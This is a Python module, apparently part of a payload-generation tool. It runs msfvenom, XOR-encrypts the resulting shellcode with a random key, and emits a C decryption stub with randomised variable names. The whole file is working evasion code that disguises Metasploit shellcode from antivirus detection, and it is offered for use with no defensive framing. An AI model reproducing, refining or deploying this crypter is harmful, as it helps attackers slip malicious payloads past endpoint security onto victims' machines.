from lib import core
from subprocess import PIPE, run
from os import urandom
from random import randint
from binascii import hexlify


def shellcode_generation(msfvenom):
    shellcode = run(msfvenom, shell=False, stdout=PIPE).stdout.decode('utf-8')
    shellcode = shellcode.replace("unsigned char buf[] =", "").replace('"', '').replace("\n", "").replace(" ", "").replace(";", "")
    core.shellcode_generated()
    encrypted_shellcode, key = shellcode_encryption(shellcode)
    vshellcode, stub = decrypt_stub(encrypted_shellcode, key)
    core.shellcode_encrypted()
    return vshellcode, stub


def shellcode_encryption(shellcode):
    key = keygen(randint(192, 256))
    encrypted_shellcode = xor(shellcode.encode('latin-1'), key)
    encrypted_shellcode = readable(encrypted_shellcode)
    key = readable(key)
    return encrypted_shellcode, key


def xor(data, key):
    while len(key) < len(data):
        key = key * 2
    data = data.decode('unicode-escape').encode('latin-1')
    return bytes(x ^ y for x, y in zip(data, key[:len(data)]))


def keygen(keylen):
    return urandom(keylen)


def readable(data):
    data = hexlify(data)
    pdata = ""
    data = data.decode('ascii')
    for i in range(0, len(data) - 1, 2):
        pdata += "\\x" + data[i] + data[i + 1]
    return pdata


def decrypt_stub(encrypted_shellcode, key):
    eshellcode = core.varname_creator()
    dkey = core.varname_creator()
    vshellcode = core.varname_creator()
    j = core.varname_creator()
    i = core.varname_creator()
    stub = "char " + eshellcode + "[]=" + '"' + encrypted_shellcode + '";\n'
    stub += "char " + dkey + "[]=" + '"' + key + '";\n'
    stub += "char " + vshellcode + "[sizeof " + eshellcode + "];\n"
    stub += "int " + j + "=0;\n"
    stub += "for (int " + i + "=0; " + i + "< sizeof " + eshellcode + "; " + i + "++){\n"
    stub += "if (" + j + "== sizeof " + dkey + "-1) " + j + "=0;\n"
    stub += vshellcode + "[" + i + "]=" + eshellcode + "[" + i + "] ^ " + dkey + "[" + j + "];\n"
    stub += j + "++;}\n"

    return vshellcode, stub

